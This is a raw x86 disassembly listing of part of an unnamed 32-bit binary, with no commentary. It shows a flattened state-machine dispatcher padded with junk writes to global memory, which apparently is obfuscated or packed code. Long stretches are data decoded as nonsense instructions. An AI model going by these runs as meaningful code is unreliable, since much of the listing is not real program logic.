  40e284:	call   0xff496014
  40e289:	add    eax,0x43378b
  40e28e:	xor    edi,esi
  40e290:	add    DWORD PTR ds:0x433863,0x2783
  40e29a:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
  40e2a1:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e2a8:	dec    DWORD PTR ds:0x4338ab
  40e2ae:	add    edi,ebx
  40e2b0:	mov    DWORD PTR ds:0x433817,0x5e0d
  40e2ba:	jmp    0x40e83c
  40e2bf:	cmp    edi,0x40
  40e2c2:	jne    0x40e31a
  40e2c8:	movzx  eax,BYTE PTR ds:0x43378b
  40e2cf:	mov    eax,ds:0x4139b4
  40e2d4:	mov    eax,DWORD PTR [eax]
  40e2d6:	mov    DWORD PTR ds:0x433857,0x3f94
  40e2e0:	mov    DWORD PTR [ebp-0x14],eax
  40e2e3:	mov    DWORD PTR ds:0x43381f,0x877
  40e2ed:	mov    eax,ds:0x413bbc
  40e2f2:	mov    DWORD PTR ds:0x43379b,0x4b6e
  40e2fc:	mov    eax,DWORD PTR [eax]
  40e2fe:	mov    DWORD PTR ds:0x43389f,0x73ce
  40e308:	mov    DWORD PTR [ebp-0x18],eax
  40e30b:	mov    DWORD PTR ds:0x4338ab,0x7077
  40e315:	jmp    0x40e830
  40e31a:	mov    DWORD PTR ds:0x43385f,0xab2
  40e324:	cmp    edi,0x33d
  40e32a:	mov    DWORD PTR ds:0x43389b,0x48b4
  40e334:	jne    0x40e3b3
  40e33a:	xor    DWORD PTR ds:0x433857,0x79d9
  40e344:	and    DWORD PTR [ebp+0x8],0x0
  40e348:	mov    eax,DWORD PTR [ebp-0x8]
  40e34b:	add    DWORD PTR ds:0x4337d3,0x4337df
  40e355:	sub    eax,DWORD PTR [ebp+0x8]
  40e358:	xor    DWORD PTR ds:0x433827,0x7a28
  40e362:	push   eax
  40e363:	sbb    DWORD PTR ds:0x433853,0x14e6
  40e36d:	mov    eax,DWORD PTR [ebp-0x4]
  40e370:	mov    DWORD PTR ds:0x433857,0x5b5
  40e37a:	add    eax,DWORD PTR [ebp+0x8]
  40e37d:	push   eax
  40e37e:	call   0x4032fa
  40e383:	mov    DWORD PTR ds:0x433783,0x5b4b
  40e38d:	inc    DWORD PTR [ebp+0x8]
  40e390:	cmp    DWORD PTR [ebp+0x8],0x52
  40e394:	mov    DWORD PTR ds:0x433783,0x3dd6
  40e39e:	jb     0x40e348
  40e3a4:	mov    DWORD PTR ds:0x433817,0x7cb6
  40e3ae:	jmp    0x40e830
  40e3b3:	mov    DWORD PTR ds:0x433783,0x6b28
  40e3bd:	cmp    edi,0x1a3
  40e3c3:	mov    DWORD PTR ds:0x43382f,0x27e
  40e3cd:	jne    0x40e58c
  40e3d3:	movzx  eax,BYTE PTR ds:0x4338ab
  40e3da:	and    DWORD PTR ds:0x43378b,eax
  40e3e0:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40e3e7:	add    DWORD PTR ds:0x4337e3,0x2f92
  40e3f1:	mov    eax,DWORD PTR [ebp-0x4]
  40e3f4:	mov    DWORD PTR [ebp-0x5c],eax
  40e3f7:	mov    eax,DWORD PTR [ebp-0x8]
  40e3fa:	mov    DWORD PTR [ebp-0x58],eax
  40e3fd:	and    eax,DWORD PTR ds:0x433893
  40e403:	jmp    0x40e53c
  40e408:	test   al,0xb5
  40e40a:	test   al,0xe6
  40e40c:	mov    cl,0xe3
  40e40e:	jo     0x40e481
  40e410:	stc    
  40e411:	ret    0x425b
  40e414:	ret    
  40e415:	xor    ax,0x1690
  40e419:	cwde   
  40e41a:	jle    0x40e49a
  40e41c:	adc    bh,BYTE PTR [edi+0x7e]
  40e41f:	jle    0x40e3d9
  40e421:	jbe    0x40e3b0
  40e423:	mov    edx,0x38fd5c0b
  40e428:	sbb    al,BYTE PTR [edx-0x7299b532]
  40e42e:	inc    ebp
  40e42f:	mov    edi,0x922586ba
  40e434:	sub    dl,BYTE PTR [edi]
  40e436:	or     ebp,ecx
  40e438:	call   0x7603:0x442f187e
  40e43f:	jecxz  0x40e4ad
  40e441:	jecxz  0x40e422
  40e443:	test   eax,0x25b01a83
  40e448:	and    BYTE PTR ds:0x7a3b6f22,ch
  40e44e:	push   ecx
  40e44f:	and    BYTE PTR [esi+0x56],ch
  40e452:	xor    DWORD PTR [edi-0x70],esp
  40e455:	mov    ah,0xf3
  40e457:	or     BYTE PTR [ecx-0xd],dl
  40e45a:	sahf   
  40e45b:	cmp    BYTE PTR [esi+edx*4+0x68],ah
  40e45f:	inc    ecx
  40e460:	lahf   
  40e461:	or     bl,bl
  40e463:	jno    0x40e473
  40e465:	test   dh,ah
  40e467:	jg     0x40e428
  40e469:	hlt    
  40e46a:	test   al,0xb
  40e46c:	or     BYTE PTR ds:0x9b4b3f99,dl
  40e472:	mov    ebp,0x469913f2
  40e477:	and    dl,dh
  40e479:	retf   
  40e47a:	mov    ecx,DWORD PTR [eax+0x11]
  40e47d:	fcomp  QWORD PTR [eax-0x31bfd1cc]
  40e483:	mov    ah,0xc2
  40e486:	adc    edi,DWORD PTR [eax+0x6e]
  40e489:	dec    ebp
  40e48a:	repz bound edx,QWORD PTR [esi-0x14]
  40e48e:	enter  0xf828,0xe4
  40e492:	fidiv  WORD PTR [eax+edi*2+0x2d]
  40e496:	test   al,0x36
  40e498:	pop    esi
  40e499:	dec    ecx
  40e49a:	mov    ss,WORD PTR [esi+esi*2+0x15808658]
  40e4a1:	and    eax,0x2a3959cf
  40e4a6:	mov    cl,0xd3
  40e4a8:	inc    edx
  40e4a9:	push   ebx
  40e4aa:	icebp  
  40e4ab:	mov    bl,0x8c
  40e4ad:	inc    ebx
  40e4ae:	loopne 0x40e52b
  40e4b0:	mov    bh,0xc3
  40e4b2:	pop    esp
  40e4b3:	sub    al,0x72
  40e4b5:	push   cs
  40e4b6:	dec    edx
  40e4b7:	cli    
  40e4b8:	test   al,0x69
  40e4ba:	(bad)  
  40e4bb:	sbb    eax,DWORD PTR [edx-0xa]
  40e4be:	call   0xca2518f6
  40e4c3:	sub    DWORD PTR [edx],eax
  40e4c5:	dec    edi
  40e4c6:	jecxz  0x40e49d
  40e4c8:	mov    esp,0x2b647fe3
  40e4cd:	icebp  
  40e4ce:	mov    esp,0x465b2c39
  40e4d3:	sti    
  40e4d4:	out    dx,al
  40e4d5:	pop    cx
  40e4d7:	das    
  40e4d8:	icebp  
  40e4d9:	jl     0x40e4a3
  40e4db:	add    dh,cl
  40e4dd:	mov    DWORD PTR [edx-0x58],ebp
  40e4e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4e1:	rol    BYTE PTR [eax],0xc8
  40e4e4:	jp     0x40e4f9
  40e4e6:	cmp    eax,DWORD PTR [eax]
  40e4e8:	fstp   st(4)
  40e4ea:	call   0xe8fc:0xe62fe447
  40e4f1:	ret    
  40e4f2:	cdq    
  40e4f3:	in     eax,dx
  40e4f4:	aas    
  40e4f5:	es out dx,eax
  40e4f7:	test   BYTE PTR [eax-0x26],ah
  40e4fa:	loope  0x40e4ec
  40e4fc:	call   0x8cc0:0x42069dc7
  40e503:	dec    ecx
  40e504:	xlat   BYTE PTR ds:[ebx]
  40e505:	pop    ecx
  40e506:	aas    
  40e507:	pop    esp
  40e508:	ret    0x4a23
  40e50b:	cmc    
  40e50c:	imul   ebx,DWORD PTR [esi+0x63076d00],0xadbc2f0c
  40e516:	add    DWORD PTR [edx-0x68],ebx
  40e519:	sbb    edx,0xce7a6f11
  40e51f:	mov    al,0x30
  40e521:	pop    ecx
  40e522:	or     DWORD PTR [ebp+0x37eee0c1],0xe73df78e
  40e52c:	sbb    ebp,eax
  40e52e:	mov    ?,WORD PTR [edx]
  40e530:	pop    es
  40e531:	jne    0x40e579
  40e533:	sub    al,0x6f
  40e535:	dec    edi
  40e536:	scas   eax,DWORD PTR es:[edi]
  40e537:	adc    BYTE PTR [ebp-0x740817af],dh
  40e53d:	inc    ebp
  40e53e:	hlt    
  40e53f:	or     DWORD PTR ds:0x433823,0x43386b
  40e549:	xor    eax,esi
  40e54b:	add    eax,ebx
  40e54d:	sbb    DWORD PTR ds:0x43385b,0x43382f
  40e557:	mov    DWORD PTR [ebp-0x54],eax
  40e55a:	lea    eax,[ebp-0x1c]
  40e55d:	mov    DWORD PTR [ebp-0x50],eax
  40e560:	mov    eax,DWORD PTR [ebp-0x60]
  40e563:	xor    eax,esi
  40e565:	add    eax,ebx
  40e567:	mov    DWORD PTR [ebp-0x60],eax
  40e56a:	lea    eax,[ebp-0x60]
  40e56d:	push   eax
  40e56e:	mov    eax,DWORD PTR [ebp+0xc]
  40e571:	xor    eax,esi
  40e573:	add    eax,ebx
  40e575:	push   eax
  40e576:	mov    eax,ds:0x413b54
  40e57b:	push   0x413aaa
  40e580:	push   DWORD PTR [eax]
  40e582:	call   0x40984d
  40e587:	jmp    0x40e830
  40e58c:	cmp    edi,0x13d
  40e592:	jne    0x40e830
  40e598:	mov    eax,DWORD PTR [ebp-0x10]
  40e59b:	xor    eax,esi
  40e59d:	add    eax,ebx
  40e59f:	mov    DWORD PTR [ebp+0x8],eax
  40e5a2:	jmp    0x40e6db
  40e5a7:	shl    BYTE PTR [eax+eax*8-0xf8f9fd0],0x74
  40e5af:	sub    eax,0x8df261b8
  40e5b4:	and    al,0x8f
  40e5b6:	inc    eax
  40e5b7:	sub    bl,BYTE PTR [ecx+0x7f127e7e]
  40e5bd:	jle    0x40e63d
  40e5bf:	shl    BYTE PTR [ebx-0x5a],1
  40e5c2:	scas   al,BYTE PTR es:[edi]
  40e5c3:	je     0x40e5ea
  40e5c5:	mov    al,ds:0x19c4ece9
  40e5ca:	adc    DWORD PTR [edi+0x614681b0],eax
  40e5d0:	add    al,0x2b
  40e5d2:	in     al,0xf8
  40e5d4:	jmpw   0xaec
  40e5d8:	xchg   edx,eax
  40e5d9:	mov    eax,0x55964121
  40e5de:	pop    eax
  40e5df:	dec    BYTE PTR [esi]
  40e5e1:	mov    ss,WORD PTR [edx-0x5a5dc485]
  40e5e7:	inc    ecx
  40e5e8:	test   BYTE PTR [eax],al
  40e5ea:	repz mov dl,dh
  40e5ed:	mov    al,0x28
  40e5ef:	inc    eax
  40e5f0:	jg     0x40e5b2
  40e5f2:	xor    esi,DWORD PTR [ebp-0x34d3772d]
  40e5f8:	mov    bh,0x9
  40e5fa:	fidiv  DWORD PTR [ebx+0x6]
  40e5fd:	sub    DWORD PTR [ecx+0x72f5532b],edx
  40e603:	pop    ecx
  40e604:	mov    bl,0x94
  40e606:	neg    DWORD PTR [edi+0x6c]
  40e609:	outs   dx,DWORD PTR ds:[esi]
  40e60a:	add    DWORD PTR [edi-0x2d7895c3],edx
  40e610:	pop    ecx
  40e611:	inc    eax
  40e612:	inc    esp
  40e613:	add    al,0xe1
  40e615:	add    eax,0xe397b94d
  40e61a:	inc    esp
  40e61b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e61c:	push   ecx
  40e61d:	cli    
  40e61e:	loopne 0x40e647
  40e620:	inc    ecx
  40e621:	ins    DWORD PTR es:[edi],dx
  40e622:	daa    
  40e623:	shr    BYTE PTR [eax],0x86
  40e626:	mov    al,0x50
  40e628:	mov    al,ds:0x43d9b4d
  40e62d:	mov    dh,0xb7
  40e62f:	inc    esp
  40e630:	inc    eax
  40e631:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e632:	(bad)  
  40e634:	jae    0x40e642
  40e636:	les    edi,FWORD PTR [ebx]
  40e638:	mov    WORD PTR [eax],?
  40e63a:	mov    bh,0xf9
  40e63c:	jmp    0x40e651
  40e63e:	pop    ebp
  40e63f:	inc    ebp
  40e640:	or     esp,esi
  40e642:	sbb    cl,cl
  40e644:	mov    ebp,0x5a2deedc
  40e649:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e64a:	xor    di,WORD PTR [eax-0x5d]
  40e64e:	inc    BYTE PTR [ebx-0x6a]
  40e651:	in     al,0x8a
  40e653:	push   esi
  40e654:	xor    DWORD PTR [esi-0xf],ecx
  40e657:	mov    ebp,0x4fd5503d
  40e65c:	jno    0x40e67e
  40e65e:	repz and eax,DWORD PTR [edx]
  40e661:	push   0x20
  40e663:	mov    cl,0xbf
  40e665:	div    DWORD PTR [esi]
  40e667:	and    ebx,DWORD PTR [ecx+0x4c]
  40e66a:	nop
  40e66b:	or     eax,0xdab2f689
  40e670:	clc    
  40e671:	sub    ebx,DWORD PTR [ebp-0x27]
  40e674:	out    dx,eax
  40e675:	xchg   ecx,eax
  40e676:	xchg   al,al
  40e678:	mov    edx,0xb3e54176
  40e67d:	pushf  
  40e67e:	(bad)  
  40e67f:	pop    ss
  40e680:	fld    TBYTE PTR [edi-0xe6b8b67]
  40e686:	mov    DWORD PTR [ecx-0x4b],esi
  40e689:	call   DWORD PTR [edx-0x4d0950e8]
  40e68f:	fadd   st,st(7)
  40e691:	mov    eax,ds:0x640c34a5
  40e696:	inc    esp
  40e697:	ins    BYTE PTR es:[edi],dx
  40e698:	mov    edi,0xe56a5801
  40e69d:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e69f:	in     al,dx
  40e6a0:	jns    0x40e69b
  40e6a2:	adc    eax,DWORD PTR [edx-0x5a]
  40e6a5:	bound  ecx,QWORD PTR [esi]
  40e6a7:	test   BYTE PTR [esi],al
  40e6a9:	xchg   BYTE PTR [ecx],al
  40e6ab:	(bad)  
  40e6ac:	in     al,dx
  40e6ad:	sub    DWORD PTR [edi],esp
  40e6af:	and    bh,0x98
  40e6b2:	pop    esi
  40e6b3:	sbb    dh,BYTE PTR [eax-0x27]
  40e6b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6b7:	adc    ch,dh
  40e6b9:	or     eax,0x2784f1eb
  40e6be:	outs   dx,BYTE PTR ds:[esi]
  40e6bf:	sbb    BYTE PTR [eax],0x42
  40e6c2:	test   al,0xbf
  40e6c4:	jecxz  0x40e699
  40e6c6:	xchg   esp,eax
  40e6c7:	mov    esi,0x78ff925d
  40e6cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6cd:	pop    esi
  40e6ce:	jne    0x40e6ff
  40e6d0:	call   0x2298:0x6f0a6837
  40e6d7:	xchg   ebx,eax
  40e6d8:	test   esp,ecx
  40e6da:	and    al,0xa1
  40e6dc:	xor    al,0x3b
  40e6de:	inc    ecx
  40e6df:	add    BYTE PTR [ecx+0x458b0845],cl
  40e6e5:	in     al,dx
  40e6e6:	jmp    0x40e81f
  40e6eb:	jb     0x40e70f
  40e6ed:	lods   al,BYTE PTR ds:[esi]
  40e6ee:	jmp    0x9bdf:0xa270706c
  40e6f5:	mov    al,BYTE PTR [ecx+0x64e50b4a]
  40e6fb:	into   
  40e6fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6fd:	jle    0x40e77d
  40e6ff:	adc    bh,BYTE PTR [edi+0x7e]
  40e702:	jle    0x40e6bc
  40e704:	mov    DWORD PTR [eax+0x6f9cd112],ebp
  40e70a:	sbb    dl,BYTE PTR [eax]
  40e70c:	push   esp
  40e70d:	stos   BYTE PTR es:[edi],al
  40e70e:	std    
  40e70f:	xchg   esi,eax
  40e710:	mov    cl,BYTE PTR [ecx]
  40e712:	sbb    edi,ebx
  40e714:	loope  0x40e6a5
  40e716:	(bad)  
  40e717:	ins    BYTE PTR es:[edi],dx
  40e718:	aam    0x35
  40e71a:	add    eax,0x84a4e41f
  40e71f:	cld    
  40e720:	addr16 jae 0x40e77f
  40e723:	push   edx
  40e724:	sbb    BYTE PTR gs:[eax-0x20f9a0f3],0xe6
  40e72c:	jns    0x40e6cc
  40e72e:	pop    esi
  40e72f:	push   ds
  40e730:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e731:	xor    eax,0x9276169
  40e736:	inc    ecx
  40e737:	neg    DWORD PTR [ecx-0x5a978c0f]
  40e73d:	add    cl,BYTE PTR [ecx]
  40e73f:	push   esp
  40e740:	pop    ebp
  40e741:	sub    ecx,DWORD PTR [ebx-0x7c392595]
  40e747:	lock xchg BYTE PTR [ecx+0x13d3cf4c],cl
  40e74e:	cwde   
  40e74f:	outs   dx,DWORD PTR ds:[esi]
  40e750:	adc    BYTE PTR [ebx],0x80
  40e753:	ins    BYTE PTR es:[edi],dx
  40e754:	inc    eax
  40e755:	inc    ebx
  40e756:	sbb    dh,BYTE PTR [edi-0x3b]
  40e759:	mov    eax,0x2867d4e
  40e75e:	lds    esp,FWORD PTR [esp+ecx*4]
  40e761:	dec    ebp
  40e762:	xor    eax,0x1fd92b12
  40e767:	cmp    ebp,esi
  40e769:	fdiv   QWORD PTR [ebp+0x56]
  40e76c:	pusha  
  40e76d:	fst    QWORD PTR [ebp+0x6a3560c9]
  40e773:	enter  0x88ee,0xfd
  40e777:	popa   
  40e778:	xor    eax,0xc4a9177a
  40e77d:	int    0xc5
  40e77f:	jle    0x40e785
  40e781:	mov    bh,0xa9
  40e783:	mov    ebx,0xd6a1cae
  40e788:	arpl   bp,di
  40e78a:	xlat   BYTE PTR ds:[ebx]
  40e78b:	cmp    DWORD PTR [ecx-0x4f],0x137a8f6d
  40e792:	mov    bh,0xea
  40e794:	inc    esp
  40e795:	mov    al,ds:0x4e5d339e
  40e79a:	add    esp,DWORD PTR [edx+0x58bf5f77]
  40e7a0:	mov    ch,0xd0
  40e7a2:	cdq    
  40e7a3:	lods   al,BYTE PTR ds:[esi]
  40e7a4:	pushf  
  40e7a5:	mov    bh,0x94
  40e7a7:	clc    
  40e7a8:	xor    DWORD PTR [esi+0x33],eax
  40e7ab:	xchg   BYTE PTR [edx+0x60],cl
  40e7ae:	call   FWORD PTR [eax+eiz*4+0x24140013]
  40e7b5:	or     eax,DWORD PTR [ebx]
  40e7b7:	mov    ds:0xf986256e,al
  40e7bc:	sbb    eax,0xba5d64fb
  40e7c1:	adc    al,0x2a
  40e7c3:	jns    0x40e80c
  40e7c5:	shl    al,1
  40e7c7:	test   dh,bl
  40e7c9:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7cb:	out    0x89,al
  40e7cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7ce:	xchg   esp,eax
  40e7cf:	stc    
  40e7d0:	iret   
  40e7d1:	push   esi
  40e7d2:	into   
  40e7d3:	mov    edi,0xd1e173c8
  40e7d8:	loop   0x40e7de
  40e7da:	imul   edi,DWORD PTR [ecx-0xab2bbad],0x25
  40e7e1:	ret    0x4fd5
  40e7e4:	xchg   ecx,eax
  40e7e5:	fwait
  40e7e6:	pop    ecx
  40e7e7:	mov    al,ds:0x9bdcff69
  40e7ec:	jno    0x40e848
  40e7ee:	dec    ebx
  40e7ef:	stos   BYTE PTR es:[edi],al
  40e7f0:	pop    eax
  40e7f1:	fild   WORD PTR [esi-0x37]
  40e7f4:	cmp    BYTE PTR gs:[edi-0x2a],dl
  40e7f8:	in     eax,0x87
  40e7fa:	cli    
  40e7fb:	xchg   esp,eax
  40e7fc:	sbb    al,0xb5
  40e7fe:	inc    ebx
  40e7ff:	sbb    al,0x1d
  40e801:	test   eax,ecx
  40e803:	push   0xffffffde
  40e805:	pusha  
  40e806:	xor    BYTE PTR [edx-0x75ebf752],ah
  40e80c:	dec    ecx
  40e80d:	dec    esi
  40e80e:	dec    ebx
  40e80f:	jge    0x40e888
  40e811:	sbb    cl,BYTE PTR [edi-0x56]
  40e814:	sub    edi,ebp
  40e816:	fidivr WORD PTR [ecx-0x5e]
  40e819:	fisubr WORD PTR [ecx-0x1bf30b0b]
  40e81f:	mov    DWORD PTR [ebp-0x4],eax
  40e822:	mov    eax,DWORD PTR [ebp-0x4]
  40e825:	push   0x4
  40e827:	pop    ecx
  40e828:	sub    ecx,eax
  40e82a:	add    ecx,DWORD PTR [ebp-0x18]
  40e82d:	mov    DWORD PTR [ebp-0x8],ecx
  40e830:	mov    eax,DWORD PTR [ebp+0xc]
  40e833:	xor    eax,esi
  40e835:	lea    edi,[edi+eax*1+0x32729b]
  40e83c:	cmp    edi,0x50b
  40e842:	jmp    0x40e97b
  40e847:	xor    al,0xd8
  40e849:	xchg   ebx,eax
  40e84a:	das    
  40e84b:	push   ebx
  40e84c:	jne    0x40e7fe
  40e84e:	loope  0x40e887
  40e850:	jecxz  0x40e800
  40e852:	loope  0x40e848
  40e854:	jmp    0xa82394dc
  40e859:	jle    0x40e8d9
  40e85b:	adc    bh,BYTE PTR [edi+0x7e]
  40e85e:	jle    0x40e8bd
  40e860:	inc    edx
  40e861:	dec    ecx
  40e862:	popa   
  40e863:	mov    ecx,0x3eeb99c0
  40e868:	shl    al,1
  40e86a:	or     al,0x1d
  40e86c:	adc    DWORD PTR [edx+0x20c456fc],esi
  40e872:	add    eax,DWORD PTR cs:[edi-0x2d1160ea]
  40e879:	scas   eax,DWORD PTR es:[edi]
  40e87a:	jne    0x40e8f9
  40e87c:	(bad)  
  40e87d:	xchg   edi,eax
  40e87e:	xor    al,BYTE PTR [ebp-0x647eea01]
  40e884:	push   ebx
  40e885:	mov    ecx,0x67f8f4e3
  40e88a:	xor    eax,0xcc6f259
  40e88f:	mov    dl,0x82
  40e891:	idiv   DWORD PTR [eax]
  40e893:	ret    0xc32f
  40e896:	pop    ecx
  40e897:	sub    eax,0xd810dc48
  40e89c:	xor    al,0xd5
  40e89e:	fwait
  40e89f:	xor    DWORD PTR [edi],ebp
  40e8a1:	add    eax,0xfe68b748
  40e8a6:	mov    cl,0xa
  40e8a8:	aas    
  40e8a9:	or     BYTE PTR [ecx],bl
  40e8ab:	sub    BYTE PTR [eax+0x6e83bd22],cl
  40e8b1:	retf   
  40e8b2:	cdq    
  40e8b3:	call   0xbd942af9
  40e8b8:	xchg   ch,ch
  40e8ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8bb:	retf   0xfe1
  40e8be:	daa    
  40e8bf:	popa   
  40e8c0:	je     0x40e8b0
  40e8c2:	sub    edx,edi
  40e8c4:	adc    cl,ah
  40e8c6:	mov    ch,0x59
  40e8c8:	loope  0x40e898
  40e8ca:	push   cs
  40e8cb:	cmp    DWORD PTR [esi+0x2e],ebx
  40e8ce:	inc    ebp
  40e8cf:	cld    
  40e8d0:	dec    ecx
  40e8d1:	mov    ch,0x70
  40e8d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8d4:	mov    WORD PTR [ebx-0xb],?
  40e8d7:	mov    ebx,DWORD PTR [esp+ebx*4]
  40e8da:	fcmove st,st(0)
  40e8dc:	in     al,0x13
  40e8de:	xchg   esi,eax
  40e8df:	sbb    eax,0xa2fa74ff
  40e8e4:	fnstsw WORD PTR [esi-0x3a4d9728]
  40e8ea:	push   eax
  40e8eb:	sbb    eax,0x339a0923
  40e8f0:	mov    edx,0x4cc37d0b
  40e8f5:	add    al,0x5c
  40e8f7:	push   cs
  40e8f8:	mov    ?,WORD PTR [esi]
  40e8fa:	inc    edx
  40e8fb:	fisttp WORD PTR [edi-0x3d]
  40e8fe:	jp     0x40e974
  40e900:	push   eax
  40e901:	push   esp
  40e902:	mov    eax,0x308c9b6b
  40e907:	mov    ch,0x3d
  40e909:	xchg   DWORD PTR [edi],eax
  40e90b:	or     eax,0x46f9d5c6
  40e910:	rol    esp,1
  40e912:	popa   
  40e913:	xchg   edi,eax
  40e914:	pop    edx
  40e915:	inc    esi
  40e916:	xchg   ebp,eax
  40e918:	pop    esi
  40e919:	and    DWORD PTR ds:0x2067ea71,edi
  40e91f:	or     BYTE PTR [edi+eiz*1-0x2b],0x36
  40e924:	jns    0x40e98a
  40e926:	add    eax,0x42e9b9f2
  40e92b:	aad    0x6a
  40e92d:	inc    ebp
  40e92e:	out    0xd1,al
  40e930:	push   ds
  40e931:	jae    0x40e8f8
  40e933:	adc    dl,BYTE PTR [ebx+0x4d3a9253]
  40e939:	mov    ch,0xea
  40e93b:	(bad)  
  40e93c:	mov    edx,0x5e1a2010
  40e941:	or     eax,0x2e401f0a
  40e946:	inc    esp
  40e947:	add    eax,0x7e6e4089
  40e94c:	sub    esi,esp
  40e94e:	aas    
  40e94f:	add    ecx,DWORD PTR [ecx+ecx*1]
  40e952:	sbb    eax,0xb7135082
  40e957:	ins    DWORD PTR es:[edi],dx
  40e958:	es mov esi,0x7d17124d
  40e95e:	lods   al,BYTE PTR ds:[esi]
  40e95f:	inc    esi
  40e960:	fwait
  40e961:	addr16 out 0xbb,eax
  40e964:	mov    ch,0x85
  40e966:	imul   esp,DWORD PTR [eax],0xffffffb5
  40e969:	and    ch,BYTE PTR [eax-0x4441df61]
  40e96f:	sub    dl,cl
  40e971:	daa    
  40e972:	fadd   DWORD PTR [ebp-0x75]
  40e975:	pop    es
  40e976:	jns    0x40e8f8
  40e978:	mov    eax,ds:0x850ff432
  40e97d:	ds stc 
  40e97f:	(bad)  
  40e980:	dec    DWORD PTR [ebx+0x335f0c45]
  40e986:	(bad)  
  40e987:	pop    esi
  40e988:	jmp    0x40eac1
  40e98d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e98e:	sbb    bl,dh
  40e990:	loope  0x40ea05
  40e992:	icebp  
  40e993:	mov    ch,0x58
  40e995:	jns    0x40e920
  40e997:	add    eax,0x3be001d
  40e99c:	pop    ebx
  40e99d:	xchg   BYTE PTR [esi+edi*2+0x7e7f127e],ah
  40e9a4:	jle    0x40e9be
  40e9a6:	push   eax
  40e9a7:	mov    ds:0x2f014cc9,eax
  40e9ac:	cmp    DWORD PTR [esi-0x9a3e372],ebx
  40e9b2:	mov    ds:0x5494e682,al
  40e9b7:	xchg   BYTE PTR [edi-0x43718669],bl
  40e9bd:	add    eax,eax
  40e9bf:	jmp    FWORD PTR [ebp+eax*2+0x7f]
  40e9c3:	push   ecx
  40e9c4:	and    ecx,DWORD PTR [esi+0x698e1a9]
  40e9ca:	mov    es,WORD PTR [esi+edi*1-0x2aad235]
  40e9d1:	cmp    bh,bh
  40e9d3:	jge    0x40e9b4
  40e9d5:	sbb    al,0x30
  40e9d7:	pushf  
  40e9d8:	cmp    eax,0xd3ecc317
  40e9dd:	xor    DWORD PTR [edx+0x36],ebx
  40e9e0:	std    
  40e9e1:	lea    eax,[edi+ebp*8+0x44]
  40e9e5:	and    BYTE PTR [eax],dl
  40e9e7:	lahf   
  40e9e8:	jmp    0x6caa:0x3d2a00d8
  40e9ef:	jo     0x40e97c
  40e9f1:	adc    cl,BYTE PTR [ebx-0x34]
  40e9f4:	jae    0x40e976
  40e9f6:	enter  0x47d3,0xeb
  40e9fa:	(bad)  
  40e9fb:	fisttp DWORD PTR [eax-0x7428d91e]
  40ea01:	loope  0x40ea3f
  40ea03:	cmc    
  40ea04:	dec    ebx
  40ea05:	(bad)  
  40ea06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea07:	sub    al,0x9b
  40ea09:	js     0x40ea28
  40ea0b:	out    dx,eax
  40ea0c:	iret   
  40ea0d:	or     DWORD PTR [edx-0xebb4da8],eax
  40ea13:	imul   esp,edx,0x5
  40ea16:	bound  ebp,QWORD PTR [edi-0x5d75d714]
  40ea1c:	dec    ecx
  40ea1d:	xor    al,0x96
  40ea1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea20:	inc    edx
  40ea21:	xchg   esp,eax
  40ea22:	jns    0x40ea64
  40ea24:	mov    ecx,0x1829a832
  40ea29:	sub    eax,0x21cf3076
  40ea2e:	push   eax
  40ea2f:	mov    esi,0x6d30cc2b
  40ea34:	mov    ebp,0x83e69573
  40ea39:	scas   eax,DWORD PTR es:[edi]
  40ea3a:	cmp    esi,DWORD PTR es:[esi]
  40ea3d:	dec    eax
  40ea3e:	stos   BYTE PTR es:[edi],al
  40ea3f:	push   eax
  40ea40:	mov    ch,0x18
  40ea42:	(bad)  
  40ea43:	dec    edx
  40ea44:	mov    al,ds:0x57e8fdbe
  40ea49:	mov    BYTE PTR [ecx+0x6b],cl
  40ea4c:	loope  0x40ea78
  40ea4e:	jge    0x40ea63
  40ea50:	mov    ds:0x5afd4d62,al
  40ea55:	adc    BYTE PTR [edx],dl
  40ea57:	sti    
  40ea58:	sub    BYTE PTR [edi+0xb],cl
  40ea5b:	adc    ch,BYTE PTR [eax+0x6b]
  40ea5e:	and    DWORD PTR [ecx-0x56cfab75],0x7cc76534
  40ea68:	(bad)  
  40ea69:	call   0xc6f7:0xbaefeb98
  40ea70:	jno    0x40ea30
  40ea72:	or     al,0x45
  40ea74:	xor    DWORD PTR [ecx],edi
  40ea76:	cdq    
  40ea77:	dec    edi
  40ea78:	or     ebx,ebp
  40ea7a:	sbb    ch,BYTE PTR [ecx-0xe]
  40ea7d:	add    al,0x3e
  40ea7f:	cld    
  40ea80:	cmp    DWORD PTR [esi-0x10472d64],0x53a6c333
  40ea8a:	or     al,BYTE PTR [edx+0x30b3ac8a]
  40ea90:	add    DWORD PTR [edi-0x3],ebx
  40ea93:	je     0x40eafe
  40ea95:	cmp    BYTE PTR [esi-0xb5d5600],al
  40ea9b:	rcl    al,cl
  40ea9d:	daa    
  40ea9e:	xchg   ebp,eax
  40ea9f:	dec    ecx
  40eaa0:	push   0x7cef76a2
  40eaa5:	mov    cl,0x5b
  40eaa7:	add    al,0x52
  40eaa9:	test   DWORD PTR [ebx+0x5cd37113],edx
  40eaaf:	add    al,0xa
  40eab1:	pop    esp
  40eab2:	lahf   
  40eab3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eab4:	jl     0x40ea47
  40eab6:	xor    BYTE PTR [esp+esi*1-0x453854c5],dl
  40eabd:	test   edi,esp
  40eabf:	or     ah,dh
  40eac1:	add    eax,ebx
  40eac3:	pop    ebx
  40eac4:	leave  
